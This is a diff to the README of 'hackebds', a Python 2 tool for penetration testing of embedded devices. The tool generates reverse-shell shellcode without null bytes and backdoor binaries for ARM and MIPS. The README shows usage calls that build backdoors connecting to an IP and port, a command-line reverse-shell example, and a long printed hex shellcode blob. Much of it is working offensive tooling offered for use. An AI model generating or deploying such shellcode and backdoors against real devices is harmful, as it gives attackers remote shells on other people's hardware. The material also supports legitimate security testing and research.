@@ -1,10 +1,10 @@
 # introduction
 
-#### foreword
+## foreword
 
 >In the process of penetration and vulnerability mining of embedded devices, many problems have been encountered. One is that some devices do not have telnetd or ssh services to obtain an interactive shell, and the other is that memory corruption vulnerabilities such as stack overflow are usually Null bytes are truncated, so it is more troublesome to construct reverse_shellcode, so this tool was developed to exploit the vulnerability. This tool is developed based on the PWN module and currently uses the python2 language
 
-#### fuction
+## fuction
 
 This tool is embedded in the security test of the device. There are two main functions:
 
@@ -12,11 +12,8 @@ This tool is embedded in the security test of the device. There are two main fun
 
 2.  Generate **reverse_shell shellcode** of various architectures during the exploit process, and no null bytes, which facilitates the exploitation of memory corruption vulnerabilities on embedded devices. **Armv5, Armv7, Armv8, mipsel, mips are now supported, and they are still being updated**
 
-#### install (1)
-#### install
-
+## install (1)
 **pip install hackebds**
-
 ```
 pip install hackebds
 ....
@@ -30,13 +27,10 @@ Successfully installed hackebds-0.0.3
 ['__builtins__', '__doc__', '__file__', '__name__', '__package__', '__path__', 'aarch64', 'arm', 'extract_shellcode', 'mips']
 >>> 
 ```
-
 You can view the function through the dir function
-
 ```
  'Corefile', 'armebv5_backdoor', 'armebv5_reverse_sl', 'armebv7_backdoor', 'armebv7_reverse_sl', 'armelv5_backdoor', 'armelv5_reverse_sl', 'armelv7_backdoor', 'armelv7_reverse_sl', 'asm', 'atexception', '
 ```
-
 #### Instructions for use
 
 ​	To use the generated backdoor or reverse_shellcode, you need to specify the ip address, port number, assembly architecture, endian （Default is armv7）
@@ -51,9 +45,7 @@ You can view the function through the dir function
 [+] No NULL byte shellcode for hex(len is 226):
 \x04\x40\x24\xe0\x7f\x70\xa0\xe3\x28\x70\x4d\xe5\x07\x70\x27\xe0\x27\x70\x4d\xe5\x07\x70\x27\xe0\x26\x70\x4d\xe5\x01\x70\xa0\xe3\x25\x70\x4d\xe5\x02\x70\xa0\xe3\x2c\x70\x4d\xe5\x2b\x40\x4d\xe5\x11\x70\xa0\xe3\x2a\x70\x4d\xe5\x5c\x70\xa0\xe3\x29\x70\x4d\xe5\x14\x40\x4d\xe5\x68\x70\xa0\xe3\x15\x70\x4d\xe5\x73\x70\xa0\xe3\x16\x70\x4d\xe5\x2f\x70\xa0\xe3\x17\x70\x4d\xe5\x6e\x70\xa0\xe3\x18\x70\x4d\xe5\x69\x70\xa0\xe3\x19\x70\x4d\xe5\x62\x70\xa0\xe3\x1a\x70\x4d\xe5\x2f\x70\xa0\xe3\x1b\x70\x4d\xe5\x1b\x40\x4d\xe2\x2c\x50\x4d\xe2\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x4f\xf0\x02\x01\x08\x46\x4f\xf0\x01\x01\x82\xea\x02\x02\x4f\xf0\xc8\x07\x07\xf1\x51\x07\x01\xdf\x06\x46\x29\x46\x4f\xf0\x10\x02\x07\xf1\x02\x07\x01\xdf\x30\x46\x81\xea\x01\x01\x4f\xf0\x3f\x07\x01\xdf\x30\x46\x01\xf1\x01\x01\x01\xdf\x30\x46\x01\xf1\x01\x01\x01\xdf\x20\x46\x81\xea\x01\x01\x82\xea\x02\x02\x03\xb4\x69\x46\x4f\xf0\x0b\x07\x01\xd
 ```
-
 **This is the usage list for generating the backdoor file of the corresponding schema**
-
 ```
 Python 2.7.17 (default, Mar 18 2022, 13:21:42) 
 [GCC 7.5.0] on linux2
@@ -64,13 +56,8 @@ mipsel_backdoor is ok in current path ./
 >>> arm.armelv7_backdoor("127.0.0.1",4444)
 backdoor_armelv7 is ok in ./
 >>> arm.armelv7_reverse_sl("127.0.0.1",4444)
-```
-
-
-#### 
-
-
-#### install (2)
+``` 
+## install (2)
   python2 install pwn
 ```
 pip install pwn
@@ -99,7 +86,7 @@ Type "help", "copyright", "credits" or "license" for more information.
 >>> sys.path
 ```
 
-#### Instructions for use
+## Instructions for use for "install (2)"
 
 ​	To use the generated backdoor or reverse_shellcode, you need to specify the ip address, port number, assembly architecture, endian （Default is armv7）
 
@@ -122,7 +109,7 @@ hackEmbedded_tool -reverse_ip 192.168.7.1 -reverse_port 444 -arch arm -endian li
 ![image-20220428161847829](./img/image-20220428161847829.png)
 
 
-#### chips and architectures
+## chips and architectures
 Tests can leverage chips and architectures
 
 Mips:
@@ -135,6 +122,6 @@ Allwinner(全志)V3s
 Armv8:
 Qualcomm Snapdragon 660
 
-#### One-click build environment
+## One-click build environment
 
 To be added
